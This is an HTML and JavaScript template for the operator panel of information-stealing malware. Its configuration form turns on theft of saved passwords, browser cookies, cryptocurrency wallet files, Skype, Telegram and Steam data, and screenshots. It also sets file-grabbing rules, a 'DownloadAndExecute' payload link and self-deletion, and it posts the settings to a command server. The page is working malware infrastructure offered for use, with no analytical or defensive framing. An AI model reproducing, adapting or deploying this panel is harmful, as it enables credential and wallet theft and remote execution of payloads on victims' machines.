<div class="info-text1">
				<center>Main Page</center>
</div>


<div class="info-text1">
<div style="display: inline-block;">
Stats<br>
%STATS%

</div>
</div>


		<div class="info-text1">
		<style>

    </style>
    <script>
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		function sendPost(params) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
           // alert(this.responseText);
        }
    }
    xhr.send(params);
};

        function deleteRow(r) {
            var i = r.parentNode.parentNode.rowIndex;
            document.getElementById("cfgTable").deleteRow(i);
        }

		function replaceSlashes(key, value) 
{
  if ( typeof value == "string")
  {
    value = value.replace(/\//g, "\\/");
  }
  return value;
}


        function AddToTable(fgName, fgPath, fgMask, fgMaxsize, fgSubfolders, fgShortcuts, fgExceptions) {
			
			checkedStr1 = '';
            if (fgSubfolders === true) checkedStr1 = 'checked';
			
            checkedStr2 = '';
            if (fgShortcuts === true) checkedStr2 = 'checked';
            var html = '<button onClick = "deleteRow(this)">[X] Delete</button>'+
				'<table class="dates-table"><tr><td>Name: </td>' +
                '<td><input class="edit" type="text" name="fgName" size="40" value = "' + fgName + '"></td></tr>' +

                '<tr><td>Path:</td>' +
                '<td><input class="edit" type="text" name="fgPath" size="40" value = "' + fgPath + '"></td>' +

                '<tr><td>Mask:</b>' +
                '<td><input class="edit" type="text" name="fgMask" size="40" value = "' + fgMask + '"></td></tr>' +

                '<tr><td>Max size:</b>' +
                '<td><input class="edit" type="number" name="fgMaxsize" size="40" value = "' + fgMaxsize + '"></td></tr>' +



                '<tr><td>Subfolders processing:</b>' +
                '<td><input type="checkbox" name="fgSubfolders" ' + checkedStr1 + '></td></tr>' +
				
				'<tr><td>Shortcuts processing:</b>' +
                '<td><input type="checkbox" name="fgShortcuts" ' + checkedStr2 + '></td></tr>' +

                '<tr><td>Exceptions:</b><br>' +
                '<td><textarea class="edit" rows="3" cols="45" name="fgExceptions">' + fgExceptions + '</textarea></td></tr></table>' +

                '<br>';


            var table = document.getElementById("cfgTable");
            var rowscount = table.getElementsByTagName("tr").length;
            var row = table.insertRow(9);
            var cell1 = row.insertCell(0);
            var cell2 = row.insertCell(1);
            cell1.innerHTML = "";

            cell2.innerHTML = html;
            //alert(cell2.innerHTML);
        }



        function ConfigToJson() {

            var obj = new Object();
            obj.isDouble = document.getElementsByName("isDouble")[0].checked;
            obj.isSavedPasswords = document.getElementsByName("isSavedPasswords")[0].checked;
            obj.isBrowserData = document.getElementsByName("isBrowserData")[0].checked;
            obj.isWallets = document.getElementsByName("isWallets")[0].checked;
            obj.isSkype = document.getElementsByName("isSkype")[0].checked;
            obj.isTelegram = document.getElementsByName("isTelegram")[0].checked;
            obj.isSteam = document.getElementsByName("isSteam")[0].checked;
			obj.isScreenshot = document.getElementsByName("isScreenshot")[0].checked;
			obj.isDelete = document.getElementsByName("isDelete")[0].checked;
            obj.DAE = document.getElementsByName("DAE")[0].value;
            obj.files = new Object();


            var fgNames = document.getElementsByName("fgName");
            var fgPaths = document.getElementsByName("fgPath");
            var fgMasks = document.getElementsByName("fgMask");
            var fgMaxsizes = document.getElementsByName("fgMaxsize");
            var fgSubfolderss = document.getElementsByName("fgSubfolders");
			var fgShortcutss = document.getElementsByName("fgShortcuts");
            var fgExceptionss = document.getElementsByName("fgExceptions");
            for (var i = 0; i < fgNames.length; i++) {			
                obj.files[i] = new Object();
                obj.files[i].fgName = Base64.encode(fgNames[i].value);
                obj.files[i].fgPath = Base64.encode(fgPaths[i].value);
                obj.files[i].fgMask = Base64.encode(fgMasks[i].value);
                obj.files[i].fgMaxsize = Base64.encode(fgMaxsizes[i].value);
                obj.files[i].fgSubfolders = (fgSubfolderss[i].checked);
				obj.files[i].fgShortcuts = (fgShortcutss[i].checked);
                obj.files[i].fgExceptions = Base64.encode(fgExceptionss[i].value);
				
				/*
				var s = "Name: " + fgNames[i].value + "\r\n" +
                 "Path: " + fgPaths[i].value + "\r\n" +
                 "Mask: " + fgMasks[i].value + "\r\n" +
                 "Max: " + fgMaxsizes[i].value + "\r\n" +
                 "IsShortcuts: " + fgShortcutss[i].checked + "\r\n" +
                 "Name: " + fgExceptionss[i].value + "\r\n";
                alert(s);
				*/
            }

            var jsonString = JSON.stringify(obj);
			sendPost('action=SetConfig&cfg='+encodeURIComponent(jsonString));
			//location.reload();
            //document.getElementsByName("output")[0].value = (jsonString);
        }



        function JsonToConfig(JSONstr) {
            obj = JSON.parse(JSONstr);
            document.getElementsByName("isDouble")[0].checked = obj.isDouble;
            document.getElementsByName("isSavedPasswords")[0].checked = obj.isSavedPasswords;
            document.getElementsByName("isBrowserData")[0].checked = obj.isBrowserData;
            document.getElementsByName("isWallets")[0].checked = obj.isWallets;
            document.getElementsByName("isSkype")[0].checked = obj.isSkype;
            document.getElementsByName("isTelegram")[0].checked = obj.isTelegram;
            document.getElementsByName("isSteam")[0].checked = obj.isSteam;
			document.getElementsByName("isScreenshot")[0].checked = obj.isScreenshot;
			document.getElementsByName("isDelete")[0].checked = obj.isDelete;
            document.getElementsByName("DAE")[0].value = obj.DAE;
            Object.keys(obj.files).forEach(function(item, i, arr) {
                AddToTable(
					Base64.decode(obj.files[i].fgName),
                    Base64.decode(obj.files[i].fgPath),
                    Base64.decode(obj.files[i].fgMask),
                    Base64.decode(obj.files[i].fgMaxsize),
					(obj.files[i].fgSubfolders),
                    (obj.files[i].fgShortcuts),
                    Base64.decode(obj.files[i].fgExceptions)
					);
            });
			
			
			
			

        }
    </script>
</head>

<body>

    <table>
        <tr>
            Config<br>

            <td>

                <table class="config-table" id="cfgTable">
                    <input type="hidden" name="action" value="SetConfig"><br>
                    <tr>
                        <td>Repeated reports:</td>
                        <td>
						

								<input type="checkbox"   name="isDouble" value="1"></td>

						
						
						
						
						
						
						
                    </tr>
                    <tr>
                        <td>Saved passwords:</td>
                        <td><input type="checkbox" name="isSavedPasswords" id="checkboxThree" value="1"></td>
                    </tr>
                    <tr>
                        <td>Cookies and autocomplete browsers:</td>
                        <td><input type="checkbox" name="isBrowserData" value="1"></td>
                    </tr>
                    <tr>
                        <td>Cryptocurrency clients files:</td>
                        <td><input type="checkbox" name="isWallets" value="1"></td>
                    </tr>
                    <tr>
                        <td>Skype History:</td>
                        <td><input type="checkbox" name="isSkype" value="1"></td>
                    </tr>
                    <tr>
                        <td>Telegram:</td>
                        <td><input type="checkbox" name="isTelegram" value="1"></td>
                    </tr>
                    <tr>
                        <td>Steam files:</td>
                        <td><input type="checkbox" name="isSteam" value="1"></td>
                    </tr>
					
					<tr>
                        <td>Screenshot:</td>
                        <td><input type="checkbox" name="isScreenshot" value="1"></td>
                    </tr>
					
                    <tr>
                        <td>Files grabber:</td>
                        <td><button onclick="AddToTable('','','','10',false,false,'')">[+] Add rule</button></td>
                    </tr>

                    <tr>
                        <td>DownloadAndExecute direct link:<br>
                            <font size="1">&nbsp&nbsp example: http://domain.com/file/payload.bin</font>
                        </td>
                        <td><input type="text" size="50"  class="edit" name="DAE" value=""></td>
                    </tr>
					
					<tr>
                        <td>Self-deletion:</td>
                        <td><input type="checkbox" name="isDelete" value="1"></td>
                    </tr>


                </table>

                <br>
                <button onClick="ConfigToJson()">Save</button>
                
				
				<script>
				window.onload = function() {
				JsonToConfig(Base64.decode('%JSONstr%'))
				//alert(Base64.encode('123'));
			};
			</script>
		</div>
		
		<div class="info-text1">
		Control<br>
		<form method="POST">
			<input type="hidden" name="action" value="EmptyTrash">	
			<input type="submit" value="EmptyTrash" class="sbutton" onclick="return confirm('Are you sure?')">
		</form>
		
		<form method="POST">
			<input type="hidden" name="action" value="DeleteAll">	
			<input type="submit" value="DeleteAll" class="sbutton" onclick="return confirm('Are you sure?')">
		</form>
		</div>
	

	
			